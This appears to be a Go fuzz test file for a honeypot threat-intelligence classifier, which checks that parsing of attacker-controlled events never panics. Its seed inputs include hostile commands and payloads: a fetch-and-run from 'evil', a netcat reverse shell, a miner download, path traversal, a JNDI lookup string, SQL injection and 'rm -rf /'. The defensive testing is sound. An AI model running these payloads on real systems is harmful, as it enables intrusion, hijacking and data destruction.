package intelligence

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// FuzzClassify drives the full classification path (ATT&CK matching + IOC
// extraction + TTP session update) with arbitrary attacker-controlled event
// fields. It must never panic and every emitted IOC must be well-formed.
func FuzzClassify(f *testing.F) {
	seeds := []struct{ cmd, user, ip, etype string }{
		{"wget http://evil/x.sh | sh", "root", "203.0.113.4", "command"},
		{"", "", "", ""},
		{"chmod 777 /tmp/x; ./x", "admin", "::1", "command"},
		{"\x00\xff\x00 nc -e /bin/sh 1.2.3.4 4444", "r", "999.999.999.999", "login_failed"},
		{"uname -a && cat /proc/cpuinfo", "ubuntu", "2001:db8::1", "command"},
	}
	for _, s := range seeds {
		f.Add(s.cmd, s.user, s.ip, s.etype)
	}

	loader := NewATTCKLoader(f.TempDir())
	loader.loadEmbedded()
	c := NewClassifier(loader, NewTTPBuilder(30*time.Minute))

	f.Fuzz(func(t *testing.T, cmd, user, ip, etype string) {
		ev := &database.Event{
			Honeypot:  "cowrie",
			EventType: etype,
			Command:   cmd,
			Username:  user,
			SourceIP:  ip,
			Timestamp: time.Now().UTC(),
		}
		iocs := c.Classify(context.Background(), ev) // must not panic
		for _, ioc := range iocs {
			if ioc == nil || ioc.Value == "" || ioc.ID == "" {
				t.Errorf("classifier emitted malformed IOC: %+v", ioc)
			}
		}
		catCheckCategories(t, ev.Categories)
	})
}

// FuzzCategorize drives the categoriser over every honeypot family with
// arbitrary attacker-controlled command and payload bytes. It must not panic,
// must stay bounded (RE2 is linear, but a counted-repetition pattern could
// still be slow) and must only ever emit catalogue IDs or CVE strings, most
// specific first.
func FuzzCategorize(f *testing.F) {
	seeds := []struct{ hp, et, cmd, payload string }{
		{"cowrie", "cowrie.command.input", "wget http://x/xmrig && chmod +x xmrig && ./xmrig -o stratum+tcp://p:1/w", ""},
		{"tanner", "tanner.http.get", "", "/x?page=../../../../etc/passwd"},
		{"redishoneypot", "redishoneypot.command", "CONFIG SET dir /var/spool/cron", ""},
		{"conpot", "conpot.modbus.command", "", ""},
		{"tanner", "tanner.http.post", "", "${jndi:ldap://x/a} UNION SELECT 1,2,3-- <script>"},
		{"cowrie", "cowrie.command.input", "\x00\xff sudo su; history -c; rm -rf /", "\x00"},
		{"mailoney", "mailoney.session", "", "RCPT TO:<x@y>"},
	}
	for _, s := range seeds {
		f.Add(s.hp, s.et, s.cmd, s.payload)
	}
	f.Fuzz(func(t *testing.T, hp, et, cmd, payload string) {
		ev := &database.Event{Honeypot: hp, EventType: et, Protocol: "http",
			Command: cmd, Payload: []byte(payload), Metadata: map[string]string{"user_agent": cmd}}
		cats := Categorize(ev) // must not panic
		catCheckCategories(t, cats)
	})
}

// catCheckCategories verifies the category invariants: every entry is a
// catalogue ID or a CVE after exploit-attempt, no duplicate IDs, and the IDs
// run in non-decreasing specificity rank.
func catCheckCategories(t *testing.T, cats []string) {
	t.Helper()
	if len(cats) > catMaxCategories+catMaxCVEs {
		t.Fatalf("too many categories (%d): %v", len(cats), cats)
	}
	seen := map[string]bool{}
	lastRank := -1
	exploitSeen := false
	for _, c := range cats {
		if IsCategory(c) {
			if seen[c] {
				t.Errorf("duplicate category %q in %v", c, cats)
			}
			seen[c] = true
			if r := categoryRankOf[c]; r < lastRank {
				t.Errorf("categories out of specificity order: %v", cats)
			} else {
				lastRank = r
			}
			exploitSeen = c == CatExploitAttempt
			continue
		}
		// A non-category entry must be a CVE directly after exploit-attempt.
		if !IsCVE(c) {
			t.Errorf("category %q is neither a catalogue ID nor a CVE: %v", c, cats)
		}
		if !exploitSeen {
			t.Errorf("CVE %q not placed after exploit-attempt: %v", c, cats)
		}
		if strings.TrimSpace(c) != c {
			t.Errorf("CVE %q has surrounding space", c)
		}
	}
}
